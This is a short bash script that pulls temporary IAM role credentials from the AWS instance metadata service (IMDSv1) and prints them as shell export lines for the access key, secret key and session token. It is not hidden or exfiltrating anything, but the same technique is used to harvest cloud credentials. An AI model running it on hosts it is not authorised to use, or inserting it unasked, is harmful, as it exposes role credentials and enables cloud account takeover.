#!/bin/bash


AWS_IMDS_V1_CREDENTIAL_URL=http://169.254.169.254/latest/meta-data/iam/security-credentials/
AWS_IAMROLE=`curl -s $AWS_IMDS_V1_CREDENTIAL_URL`
AWS_CREDENTIAL_JSON=`curl -s ${AWS_IMDS_V1_CREDENTIAL_URL}${AWS_IAMROLE}`

echo '--------- credential ---------'
echo 'export AWS_ACCESS_KEY_ID='`echo $AWS_CREDENTIAL_JSON | jq .AccessKeyId`
echo 'export AWS_SECRET_ACCESS_KEY='`echo $AWS_CREDENTIAL_JSON | jq .SecretAccessKey`
echo 'export AWS_SESSION_TOKEN='`echo $AWS_CREDENTIAL_JSON | jq .Token`
